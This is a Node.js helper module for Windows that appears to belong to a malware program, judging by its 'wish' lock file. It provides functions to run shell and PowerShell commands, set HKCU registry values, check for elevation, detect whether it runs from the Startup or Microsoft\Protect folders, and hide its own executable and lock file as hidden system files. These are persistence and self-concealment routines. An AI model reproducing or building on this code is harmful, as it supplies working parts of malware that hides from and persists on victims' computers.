const child_process = require('child_process');
const util = require("util");
const fs = require('fs');
const path = require('path');

const Winreg = require('winreg');

const exec = util.promisify(child_process.exec);

const delay = async (ms) => {
    return await new Promise(resolve => setTimeout(resolve, ms));
};

const execCommand = async (command) => {
    try {
        const { stdout } = await exec(command);
        return stdout.trim();
    } catch (error) {
        console.error(error);
        return '';
    }
};

const execPowerShell = async (command) => {
    try {
        const { stdout } = await exec(`powershell -Command "${command}"`);
        return stdout.trim();
    } catch (error) {
        console.error(error);
        return '';
    }
};

const setRegistryValue = ({ keyPath, name, type, value }) => {
    const regKey = new Winreg({
        hive: Winreg.HKCU,
        key: keyPath,
    });

    return new Promise((resolve, reject) => {
        regKey.set(name, Winreg[type], value, (error) => {
            if (!error) {
                resolve();
            } else {
                reject(error);
            }
        });
    });
};

const isElevated = async () => {
    return new Promise((resolve, reject) => {
        child_process.exec('net session', (error) => {
            resolve(!error);
        });
    });
};

const isRunningStartupDir = () => {
    try {
        const exePath = process.execPath;
        const dirPath = path.dirname(exePath);

        const startupPath = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup';
        const protectPath = path.join(process.env.APPDATA, 'Microsoft', 'Protect');

        if (dirPath === startupPath || dirPath === protectPath) {
            return true;
        }
    } catch (error) {
        return false;
    }

    return false;
};

const randString = (length) => {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    return Array.from({ length }, () => charset[Math.floor(Math.random() * charset.length)]).join('');
};

const lockFilePath = path.join(__dirname, `.wish.lock`);

const isWishRunning = () => {
    return fs.existsSync(lockFilePath);
};

const createUpLock = () => {
    fs.writeFileSync(lockFilePath, process.pid.toString());
    child_process.exec(`attrib +h +s "${lockFilePath}"`);
};

const cleanUpLock = () => {
    if (fs.existsSync(lockFilePath)) {
        fs.unlinkSync(lockFilePath);
    };
};

const hideSelf = async () => {
    const exe = process.execPath;
    return new Promise((resolve, reject) => {
        child_process.exec(`attrib +h +s "${exe}"`, (error) => {
            if (!error) {
                resolve();
            } else {
                reject(error);
            }
        });
    });
};

module.exports = {
    delay,
    randString,
    isWishRunning,
    setRegistryValue,
    cleanUpLock,
    createUpLock,
    isRunningStartupDir,
    isElevated,
    hideSelf,
    execCommand,
    execPowerShell
}
